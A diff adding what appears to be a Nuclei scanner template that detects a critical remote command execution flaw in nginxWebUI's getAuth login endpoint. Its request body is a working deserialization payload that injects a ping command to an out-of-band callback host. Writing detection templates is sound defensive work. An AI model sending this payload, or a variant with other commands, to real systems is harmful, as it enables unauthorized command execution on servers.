@@ -1,0 +1,26 @@
+id: nginx-webui-getAuth-rce
+
+info:
+  name: nginxWebUI远程命令执行漏洞
+  author: nginxWebUI
+  severity: critical
+  tags: nginxWebUI
+
+http:
+  - raw:
+      - |
+        POST /adminPage/login/getAuth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name": {"@type": "sun.print.UnixPrintServiceLookup","lpcFirstCom": [";ping -c 2 {{interactsh-url}};",";ping -c 2 {{interactsh-url}};"]}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: dsl
+        dsl:
+          - 'len(body) < 10'
+    matchers-condition: and
